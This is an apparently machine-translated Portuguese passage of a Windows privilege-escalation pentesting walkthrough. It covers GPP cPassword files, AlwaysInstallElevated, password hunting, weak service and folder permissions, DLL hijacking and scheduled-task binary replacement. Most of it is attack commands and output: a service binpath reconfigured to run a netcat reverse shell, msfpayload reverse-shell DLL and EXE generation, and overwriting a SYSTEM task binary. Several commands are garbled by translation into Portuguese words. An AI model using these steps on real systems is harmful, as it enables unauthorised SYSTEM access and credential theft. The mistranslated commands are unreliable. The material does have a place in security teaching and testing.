Por recomendação de Ben Campbell ( @Meatballs__ ), estou adicionando senhas salvas nas Preferências de Política de Grupo à lista de falhas rápidas. Arquivos de preferências de GPO podem ser usados ​​para criar usuários locais em máquinas de domínio. Quando a caixa que você comprometeu está conectada a um domínio, vale a pena procurar o arquivo Groups.xml que está armazenado em SYSVOL. Qualquer usuário autenticado terá acesso de leitura a este arquivo. A senha no arquivo xml é "obscura" do usuário casual, criptografando-a com AES, digo obscurecida porque a chave estática é publicada no site do msdn, permitindo fácil descriptografia do valor armazenado.

 


 

Além de Groups.xml, vários outros arquivos de preferência de política podem ter o conjunto de atributos opcional "cPassword":
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element , TaskV2 Inner Element , ImmediateTaskV2 Inner Element
Printers\ Printers.xml: SharedPrinter Element
Drives\Drives.xml: Atributos específicos do elemento
DataSources\DataSources.xml: Atributos específicos do elemento

 

Esta vulnerabilidade pode ser explorada navegando manualmente no SYSVOL e obtendo os arquivos relevantes conforme demonstrado abaixo.

 


 

No entanto, todos nós gostamos de soluções automatizadas para que possamos chegar à linha de chegada o mais rápido possível. Existem duas opções principais aqui, dependendo do tipo de shell/acesso que temos. Existe (1) um módulo metasploit que pode ser executado através de uma sessão estabelecida aqui ou (2) você pode usar Get-GPPPassword que faz parte do PowerSploit . PowerSploit é uma excelente estrutura PowerShell, de Matt Graeber, adaptada para engenharia reversa, análise forense e pentesting.

 

A próxima coisa que procuraremos é uma configuração de registro estranha "AlwaysInstallElevated". Se esta configuração estiver habilitada, ela permitirá que usuários de qualquer nível de privilégio instalem arquivos *.msi como NT AUTHORITY\SYSTEM. Parece-me uma ideia estranha que você crie usuários com poucos privilégios (para restringir o uso do sistema operacional), mas dê a eles a capacidade de instalar programas como SYSTEM. Para obter mais informações sobre esse assunto, você pode dar uma olhada aqui em um artigo de Parvez da GreyHatHacker, que originalmente relatou isso como uma preocupação de segurança.

Para podermos usar isso, precisamos verificar se duas chaves de registro estão definidas; se for esse o caso, podemos abrir um shell SYSTEM. Você pode ver a sintaxe para consultar as respectivas chaves de registro abaixo.

# Isso só funcionará se ambas as chaves de registro contiverem "AlwaysInstallElevated" com valores DWORD de 1.

C:\Windows\system32 > consulta de registro HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
C:\Windows\system32 > consulta de registro HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

 

Para finalizar esta seção, faremos uma pesquisa rápida no sistema operacional e esperamos encontrar o ouro. Você pode ver a sintaxe de nossas pesquisas abaixo.

# O comando abaixo irá pesquisar no sistema de arquivos nomes de arquivos contendo certas palavras-chave. Você pode
especifique quantas palavras-chave desejar.

C:\Windows\system32 > dir /s *pass* == *cred* == *vnc* == *.config*

# Pesquise uma palavra-chave em determinados tipos de arquivo, isso pode gerar muitos resultados.

C:\Windows\system32 > findstr /si senha *.xml *.ini *.txt

# Da mesma forma, os dois comandos abaixo podem ser usados ​​para procurar palavras-chave no registro, neste caso "senha".

C:\Windows\system32 > consulta de registro HKLM /f senha /t REG_SZ /s 
C:\Windows\system32 > consulta de registro HKCU /f senha /t REG_SZ /s

 

Δt para t7 a t10 - Arregace as mangas
Esperamos que agora já tenhamos um shell SYSTEM, mas se não tivermos, ainda restam alguns caminhos de ataque para examinar. Nesta parte final, veremos os serviços do Windows e as permissões de arquivos/pastas. Nosso objetivo aqui é usar permissões fracas para elevar nossos privilégios de sessão.

Estaremos verificando muitos direitos de acesso, então devemos pegar uma cópia do accesschk.exe, que é uma ferramenta do Sysinternals Suite da Microsoft. O Microsoft Sysinternals contém muitas ferramentas excelentes, é uma pena que a Microsoft não as tenha adicionado à versão padrão do Windows. Você pode baixar o pacote do Microsoft technet aqui .

Começaremos com os serviços do Windows, pois há alguns ganhos rápidos que podem ser encontrados lá. Geralmente os sistemas operacionais modernos não contêm serviços vulneráveis. Vulnerável, neste caso, significa que podemos reconfigurar os parâmetros do serviço. Os serviços do Windows são como atalhos de aplicativos, veja o exemplo abaixo.

# Podemos usar sc para consultar, configurar e gerenciar serviços do Windows.

C:\Windows\system32 > sc qc Spooler

[SC] QueryServiceConfig SUCESSO

SERVICE_NAME: Spooler
        TIPO: 110 WIN32_OWN_PROCESS (interativo)
        START_TYPE: 2 AUTO_START
        ERROR_CONTROL: 1 NORMAL
        BINARY_PATH_NAME: C:\Windows\System32\spoolsv.exe
        LOAD_ORDER_GROUP: Grupo de spooler
        ETIQUETA: 0
        DISPLAY_NAME: Spooler de impressão
        DEPENDÊNCIAS: RPCSS
                           :http
        SERVICE_START_NAME: sistema local

 

Podemos verificar o nível de privilégio necessário para cada serviço usando accesschk.

# Podemos ver as permissões que cada nível de usuário possui, você também pode usar "accesschk.exe -ucqv *" para listar
todos os serviços.

C:\ > accesschk.exe -ucqv Spooler

Carretel

  AUTORIDADE R NT\Usuários autenticados
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVIÇO_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  R BUILTIN\Usuários avançados
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVIÇO_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVIÇO_START
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  RW BUILTIN\Administradores
        SERVICE_ALL_ACCESS
  AUTORIDADE RW NT\SISTEMA
        SERVICE_ALL_ACCESS

 

O Accesschk pode verificar automaticamente se temos acesso de gravação a um serviço do Windows com um determinado nível de usuário. Geralmente, como um usuário com poucos privilégios, desejaremos verificar "Usuários autenticados". Certifique-se de verificar a quais grupos de usuários seu usuário pertence. "Usuários avançados", por exemplo, é considerado um grupo de usuários com poucos privilégios (embora não seja amplamente utilizado).

Vamos comparar a saída no Windows 8 e no Windows XP SP0.

# Isso está no Windows 8.

C:\Users\b33f\tools\Sysinternals > accesschk.exe -uwcqv "Usuários autenticados" *
Nenhum objeto correspondente encontrado.

# Em um Windows XP SP0 padrão, podemos ver que há uma grande falha de segurança.

C:\ > accesschk.exe -uwcqv "Usuários autenticados" *
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnhost
        SERVICE_ALL_ACCESS
		
C:\ > accesschk.exe -ucqv SSDPSRV

SSDPSRV

  AUTORIDADE RW NT\SISTEMA
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administradores
        SERVICE_ALL_ACCESS
  AUTORIDADE RW NT\Usuários autenticados
        SERVICE_ALL_ACCESS
  RW BUILTIN\Usuários avançados
        SERVICE_ALL_ACCESS
  AUTORIDADE RW NT\SERVIÇO LOCAL
        SERVICE_ALL_ACCESS

C:\ > accesschk.exe -ucqv upnphost

upnphost

  AUTORIDADE RW NT\SISTEMA
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administradores
        SERVICE_ALL_ACCESS
  AUTORIDADE RW NT\Usuários autenticados
        SERVICE_ALL_ACCESS
  RW BUILTIN\Usuários avançados
        SERVICE_ALL_ACCESS
  AUTORIDADE RW NT\SERVIÇO LOCAL
        SERVICE_ALL_ACCESS

 

Esse problema foi resolvido posteriormente com a introdução do XP SP2; no entanto, no SP0 e SP1 ele pode ser usado como uma vulnerabilidade universal de escalonamento de privilégios locais. Ao reconfigurar o serviço, podemos permitir que ele execute qualquer binário de nossa escolha com privilégios de nível SYSTEM.

Vamos dar uma olhada em como isso é feito na prática. Neste caso, o serviço executará o netcat e abrirá um shell reverso com privilégios de nível SYSTEM. Outras opções são certamente possíveis.

C:\ > sc qc upnphost

[SC] GetServiceConfig SUCESSO

SERVICE_NAME: upnphost
        TIPO: 20 WIN32_SHARE_PROCESS
        START_TYPE: 3 DEMAND_START
        ERROR_CONTROL: 1 NORMAL
        BINARY_PATH_NAME: C:\WINDOWS\System32\svchost.exe -k LocalService
        LOAD_ORDER_GROUP:
        ETIQUETA: 0
        DISPLAY_NAME: host de dispositivo Plug and Play universal
        DEPENDÊNCIAS: SSDPSRV
        SERVICE_START_NAME: NT AUTHORITY\LocalService
		
C:\ > sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
[SC] ChangeServiceConfig SUCESSO

C:\ > sc config upnphost obj= ".\LocalSystem" senha= ""
[SC] ChangeServiceConfig SUCESSO

C:\ > sc qc upnphost

[SC] GetServiceConfig SUCESSO

SERVICE_NAME: upnphost
        TIPO: 20 WIN32_SHARE_PROCESS
        START_TYPE: 3 DEMAND_START
        ERROR_CONTROL: 1 NORMAL
        BINARY_PATH_NAME: C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe
        LOAD_ORDER_GROUP:
        ETIQUETA: 0
        DISPLAY_NAME: host de dispositivo Plug and Play universal
        DEPENDÊNCIAS: SSDPSRV
        SERVICE_START_NAME: sistema local
		
C:\ > net start upnphost

 


Shell de serviço (upnphost)

 

 

 

 

 

 

 

 

Nem sempre teremos acesso total a um serviço, mesmo que ele esteja configurado incorretamente. A imagem abaixo foi tirada da apresentação de Brett Moore sobre escalonamento de privilégios do Windows, qualquer um desses direitos de acesso nos dará um shell SYSTEM.

 


 

O importante a lembrar é que descobrimos a quais grupos de usuários pertence nossa sessão comprometida. Conforme mencionado anteriormente, "Usuários avançados" também são considerados um grupo de usuários com poucos privilégios. "Usuários avançados" têm seu próprio conjunto de vulnerabilidades. Mark Russinovich escreveu um artigo muito interessante sobre o assunto.

O poder dos usuários avançados (Mark Russinovich) - aqui

Finalmente examinaremos as permissões de arquivos/pastas. Se não pudermos atacar o sistema operacional diretamente, deixaremos o sistema operacional fazer todo o trabalho pesado. Há muito terreno a ser abordado aqui, então, em vez disso, mostrarei dois tipos de vulnerabilidades de permissão e como tirar vantagem delas. Depois de compreender a ideia geral, você será capaz de aplicar essas técnicas a outras situações.

Para nosso primeiro exemplo, replicaremos os resultados de uma postagem escrita por Parvez do GreyHatHacker; "Elevando privilégios explorando permissões de pastas fracas" . Este é um ótimo artigo sobre escalonamento de privilégios e eu recomendo fortemente que você leia a postagem dele aqui .

Este exemplo é um caso especial de sequestro de DLL. Os programas geralmente não funcionam sozinhos, eles têm muitos recursos aos quais precisam se conectar (principalmente DLLs, mas também arquivos proprietários). Se um programa ou serviço carrega um arquivo de um diretório ao qual temos acesso de gravação, podemos abusar disso para abrir um shell com os privilégios com os quais o programa é executado.

Geralmente, um aplicativo do Windows usará caminhos de pesquisa predefinidos para localizar DLLs e verificará esses caminhos em uma ordem específica. O sequestro de DLL geralmente acontece colocando uma DLL maliciosa em um desses caminhos, garantindo que a DLL seja encontrada antes da legítima. Esse problema pode ser atenuado fazendo com que o aplicativo especifique caminhos absolutos para as DLLs necessárias.

Você pode ver a ordem de pesquisa de DLL em sistemas de 32 bits abaixo:
1 - O diretório a partir do qual o aplicativo foi carregado
2 - Diretório do sistema de 32 bits (C:\Windows\System32)
3 - Diretório do sistema de 16 bits (C:\Windows \System)
4 - Diretório do Windows (C:\Windows)
5 - O diretório de trabalho atual (CWD)
6 - Diretórios na variável de ambiente PATH (sistema e depois usuário)

Às vezes acontece que aplicativos tentam carregar DLLs que não existem na máquina . Isso pode ocorrer por vários motivos, por exemplo, se a DLL for necessária apenas para determinados plug-ins ou recursos que não estão instalados. Neste caso, Parvez descobriu que certos serviços do Windows tentam carregar DLLs que não existem nas instalações padrão.

Como a DLL em questão não existe acabaremos percorrendo todos os caminhos de busca. Como um usuário com poucos privilégios, temos pouca esperança de colocar uma DLL maliciosa em 1-4,5 não é uma possibilidade neste caso porque estamos falando de um serviço do Windows, mas se tivermos acesso de gravação a qualquer um dos diretórios do Windows PATH ganhamos.

Vamos dar uma olhada em como isso funciona na prática, para nosso exemplo usaremos o serviço IKEEXT (IKE e AuthIP IPsec Keying Modules) que tenta carregar wlbsctrl.dll.

# Isso está no Windows 7 como usuário1 com baixo privilégio.

C:\Usuários\usuário1\Desktop > echo %nomedeusuário%

usuário1

# Temos uma vitória aqui, pois qualquer diretório não padrão em "C:\" dará acesso de gravação a arquivos autenticados
Usuários.
		
C:\Usuários\usuário1\Desktop > echo %caminho%

C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Arquivos de Programas\OpenVPN\bin;C:\Python27

# Podemos verificar nossas permissões de acesso com accesschk ou cacls.

C:\Usuários\user1\Desktop > accesschk.exe -dqv "C:\Python27"

C:\Python27
  Nível Obrigatório Médio (Padrão) [No-Write-Up]
  RW BUILTIN\Administradores
        FILE_ALL_ACCESS
  AUTORIDADE RW NT\SISTEMA
        FILE_ALL_ACCESS
  R BUILTIN\Usuários
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_EA
        FILE_TRAVERSE
        SINCRONIZAR
        READ_CONTROL
  AUTORIDADE RW NT\Usuários autenticados
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_EA
        EXCLUIR
        SINCRONIZAR
        READ_CONTROL

C:\Users\user1\Desktop > cacls "C:\Python27"

C:\Python27 BUILTIN\Administradores:(ID)F
            BUILTIN\Administradores:(OI)(CI)(IO)(ID)F
            AUTORIDADE NT\SISTEMA:(ID)F
            AUTORIDADE NT\SISTEMA:(OI)(CI)(IO)(ID)F
            BUILTIN\Usuários:(OI)(CI)(ID)R
            AUTORIDADE NT\Usuários autenticados:(ID)C
            AUTORIDADE NT\Usuários autenticados:(OI)(CI)(IO)(ID)C
			
# Antes de passarmos à ação, precisamos verificar o status do serviço IKEEXT. Neste caso podemos ver
está definido como "AUTO_START" para iniciar na inicialização!
		
C:\Users\user1\Desktop > sc qc IKEEXT

[SC] QueryServiceConfig SUCESSO

SERVIÇO_NAME: IKEEXT
        TIPO: 20 WIN32_SHARE_PROCESS
        START_TYPE: 2 AUTO_START
        ERROR_CONTROL: 1 NORMAL
        BINARY_PATH_NAME: C:\Windows\system32\svchost.exe -k netsvcs
        LOAD_ORDER_GROUP:
        ETIQUETA: 0
        DISPLAY_NAME: Módulos de codificação IKE e AuthIP IPsec
        DEPENDÊNCIAS: BFE
        SERVICE_START_NAME: sistema local

 

Agora que sabemos que as condições necessárias foram atendidas, podemos gerar uma DLL maliciosa e abrir um shell!

root@darkside :~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O

       Nome: Shell de comando do Windows, TCP reverso embutido
     Módulo: carga útil/windows/shell_reverse_tcp
   Plataforma: Windows
       Arco: x86
Precisa de administrador: Não
 Tamanho total: 314
       Classificação: Normal

Fornecido por:
  vlad902 <vlad902@gmail.com>
  sf <stephen_fewer@harmonysecurity.com>

Opções básicas:
Nome Configuração Atual Obrigatório Descrição
---- --------------- -------- -----------
Processo EXITFUNC sim Técnica de saída: seh, thread, process, none
LHOST 127.0.0.1 sim O endereço de escuta
LPORT 9988 sim A porta de escuta

Descrição:
  Conecte-se novamente ao invasor e gere um shell de comando

root@darkside :~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D >
/root/Desktop/evil.dll

Criado por msfpayload (http://www.metasploit.com).
Carga útil: windows/shell_reverse_tcp
 Comprimento: 314
Opções: {"lhost"=>"127.0.0.1", "lport"=>"9988"}

 

Depois de transferir a DLL para nossa máquina de destino, tudo o que precisamos fazer é renomeá-la para wlbsctrl.dll e movê-la para "C:\Python27". Feito isso, precisamos esperar pacientemente que a máquina seja reinicializada (ou podemos tentar forçar uma reinicialização) e obteremos um shell SYSTEM.

# Novamente, este é o usuário1 com baixo privilégio.

C:\Usuários\usuário1\Desktop > diretório

 O volume na unidade C não tem rótulo.
 O número de série do volume é 948D-A98F

 Diretório de C:\Users\user1\Desktop

18/02/2014 13h49 <DIR> .
18/02/2014 13h49 <DIR> ..
22/04/2013 09:39 331.888 accesschk.exe
18/02/2014 12h38 14.336 mal.dll
25/01/2014 12h46 36.864 fubar.exe
22/01/2014 08h17 <DIR> incógnito2
30/06/2011 13h52 1.667.584 ncat.exe
22/11/2013 19h39 1.225 wmic_info.bat
               5 Arquivo(s) 2.051.897 bytes
               3 diretório(s) 73.052.160 bytes livres

C:\Users\user1\Desktop > copiar evil.dll C:\Python27\wlbsctrl.dll

        1 arquivo(s) copiado(s).
		
C:\Users\user1\Desktop > diretório C:\Python27

 O volume na unidade C não tem rótulo.
 O número de série do volume é 948D-A98F

 Diretório de C:\Python27

18/02/2014 13h53 <DIR> .
18/02/2014 13h53 <DIR> ..
20/10/2012 02h52 <DIR> DLLs
20/10/2012 02h52 <DIR> Documento
20/10/2012 02h52 <DIR> incluir
28/01/2014 03:45 <DIR> Lib
20/10/2012 02h52 <DIR> bibliotecas
10/04/2012 23h34 40.092 LICENSE.txt
10/04/2012 23h18 310.875 NOTÍCIAS.txt
10/04/2012 23h31 26.624 python.exe
10/04/2012 23h31 27.136 pythonw.exe
10/04/2012 23h18 54.973 README.txt
20/10/2012 02h52 <DIR> tcl
20/10/2012 02h52 <DIR> Ferramentas
10/04/2012 23h31 49.664 w9xpopen.exe
18/02/2014 12h38 14.336 wlbsctrl.dll
               7 Arquivo(s) 523.700 bytes
               9 diretório(s) 73.035.776 bytes livres

 

Está tudo configurado, tudo o que precisamos fazer agora é aguardar a reinicialização do sistema. Para fins de demonstração, incluí uma captura de tela abaixo, onde uso um prompt de comando do administrador para reiniciar manualmente o serviço.

 


Shell de serviço (IKEEXT)

 

 

 

 

 

 

 

 

Para nosso exemplo final, daremos uma olhada nas tarefas agendadas. Examinando os resultados que coletamos anteriormente, encontramos a seguinte entrada.

Nome do host: B33F
Nome da tarefa: \LogGrabberTFTP
Próxima execução: 19/02/2014 9:00:00 AM
Estado: Pronto
Modo de login: interativo/em segundo plano
Tempo da última execução: N/A
Último resultado: 1
Autor: B33F\b33f
Tarefa a ser executada: E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt
Início em: N/A
Comentário: N/A
Estado da tarefa agendada: ativado
Tempo ocioso: desativado
Gerenciamento de energia: parada no modo bateria, sem inicialização nas baterias
Executar como usuário: SYSTEM
Excluir tarefa se não for reprogramada: ativado
Parar tarefa se for executado X horas e X minutos: 72:00:00
Agendamento: os dados de agendamento não estão disponíveis neste formato.
Tipo de horário: Diário
Hora de início: 9h00
Data de início: 17/02/2014
Data de término: N/A
Dias: A cada 1 dia(s)
Meses: N/A
Repetir: Todos: Desativado
Repetir: Até: Hora: Desativado
Repetir: Até: Duração: Desativado
Repita: Pare se ainda estiver em execução: Desativado

 

Parece haver um cliente TFTP na caixa que está se conectando a um host remoto e capturando algum tipo de arquivo de log. Podemos ver que esta tarefa é executada todos os dias às 9h e com privilégios de nível SYSTEM (ai). Vamos dar uma olhada se temos acesso de gravação a esta pasta.

C:\Usuários\user1\Desktop > accesschk.exe -dqv "E:\GrabLogs"

E:\GrabLogs
  Nível Obrigatório Médio (Padrão) [No-Write-Up]
  RW BUILTIN\Administradores
        FILE_ALL_ACCESS
  AUTORIDADE RW NT\SISTEMA
        FILE_ALL_ACCESS
  AUTORIDADE RW NT\Usuários autenticados
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_EA
        EXCLUIR
        SINCRONIZAR
        READ_CONTROL
  R BUILTIN\Usuários
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_EA
        FILE_TRAVERSE
        SINCRONIZAR
        READ_CONTROL
		
C:\Users\user1\Desktop > diretório "E:\GrabLogs"

 O volume na unidade E é maior
 O número de série do volume é FD53-2F00

 Diretório de E:\GrabLogs

18/02/2014 23h34 <DIR> .
18/02/2014 23h34 <DIR> ..
18/02/2014 23h34 <DIR> Registros
18/02/2014 21h21 180.736 tftp.exe
               1 arquivo(s) 180.736 bytes
               3 diretório(s) 5.454.602.240 bytes livres

 

É evidente que este é um problema sério de configuração, não há necessidade de esta tarefa ser executada como SYSTEM, mas pior ainda é o fato de qualquer usuário autenticado ter acesso de gravação à pasta. Idealmente, para um teste de pentesting, eu pegaria o cliente TFTP, faria backdoor no executável PE, certificando-me de que ele ainda funcionasse perfeitamente e depois o colocaria de volta na máquina de destino. No entanto, para o propósito deste exemplo, podemos simplesmente substituir o binário por um executável gerado pelo metasploit.

root@darkside :~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O

       Nome: Shell de comando do Windows, TCP reverso embutido
     Módulo: carga útil/windows/shell_reverse_tcp
   Plataforma: Windows
       Arco: x86
Precisa de administrador: Não
 Tamanho total: 314
       Classificação: Normal

Fornecido por:
  vlad902 <vlad902@gmail.com>
  sf <stephen_fewer@harmonysecurity.com>

Opções básicas:
Nome Configuração Atual Obrigatório Descrição
---- --------------- -------- -----------
Processo EXITFUNC sim Técnica de saída: seh, thread, process, none
LHOST 127.0.0.1 sim O endereço de escuta
LPORT 9988 sim A porta de escuta

Descrição:
  Conecte-se novamente ao invasor e gere um shell de comando

root@darkside :~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
exe > /root/Desktop/evil-tftp.exe

[*] x86/shikata_ga_nai teve sucesso com tamanho 341 (iteração = 1)

 

Tudo o que resta agora é fazer o upload do nosso executável malicioso e sobrescrever "E:\GrabLogs\tftp.exe". Feito isso, podemos dormir cedo e acordar pela manhã. Uma coisa importante a lembrar aqui é que verificamos a hora/fuso horário na caixa que estamos tentando comprometer.

C:\Usuários\usuário1\Desktop > diretório

 O volume na unidade C não tem rótulo.
 O número de série do volume é 948D-A98F

 Diretório de C:\Users\user1\Desktop

19/02/2014 01h36 <DIR> .
19/02/2014 01h36 <DIR> ..
22/04/2013 09:39 331.888 accesschk.exe
19/02/2014 01h31 73.802 evil-tftp.exe
25/01/2014 12h46 36.864 fubar.exe
22/01/2014 08h17 <DIR> incógnito2
30/06/2011 13h52 1.667.584 ncat.exe
18/02/2014 12h38 14.336 wlbsctrl.dll
22/11/2013 19h39 1.225 wmic_info.bat
               6 Arquivo(s) 2.125.699 bytes
               3 diretório(s) 75.341.824 bytes livres
		
C:\Users\user1\Desktop > copiar evil-tftp.exe E:\GrabLogs\tftp.exe

Substituir E:\GrabLogs\tftp.exe? (Sim/Não/Todos): Sim
        1 arquivo(s) copiado(s).

 

Para demonstrar esse escalonamento de privilégios em ação, avancei a hora do sistema. Na captura de tela abaixo, podemos ver que nosso shell SYSTEM é apresentado pontualmente às 9h.

 


Shell Schtasks (LogGrabberTFTP)

 

 

 

 

 

 

 

 

Esses dois exemplos devem dar uma ideia sobre os tipos de vulnerabilidades que precisamos procurar ao considerar as permissões de arquivos/pastas. Você precisará de algum tempo para examinar TODOS os binpaths dos serviços do Windows, tarefas agendadas e tarefas de inicialização.

Como pudemos ver, o accesschk é a ferramenta preferida aqui. Antes de terminar, gostaria de dar algumas dicas finais sobre como usar o accesschk.

# Ao executar qualquer uma das ferramentas sysinternals pela primeira vez, o usuário será apresentado a uma GUI
pop-up para aceitar o EULA. Obviamente, este é um grande problema, mas podemos adicionar um sinalizador extra de linha de comando
para aceitar automaticamente o EULA.

accesschk.exe /accepteula ... ... ...

# Encontre todas as permissões de pasta fracas por unidade.
accesschk.exe -uwdqs Usuários c:\
accesschk.exe -uwdqs "Usuários autenticados" c:\

# Encontre todas as permissões de arquivo fracas por unidade.
accesschk.exe -uwqs Usuários c:\*.*
accesschk.exe -uwqs "Usuários autenticados" c:\*.*

 

Pensamentos finais
Este guia pretende ser um "fundamento" para o escalonamento de privilégios do Windows. Se você quiser realmente dominar o assunto, precisará trabalhar muito e pesquisar. Tal como acontece com todos os aspectos do pentesting, a enumeração é fundamental. Quanto mais você souber sobre o alvo, mais possibilidades de ataque você terá, maior será a taxa de sucesso.

Lembre-se também de que às vezes você pode acabar elevando seus privilégios a Administrador. Escalar privilégios de Administrador para SYSTEM não é um problema, você sempre pode reconfigurar um serviço ou criar uma tarefa agendada com privilégios de nível SYSTEM.

Agora vá em frente e abra o SYSTEM!!
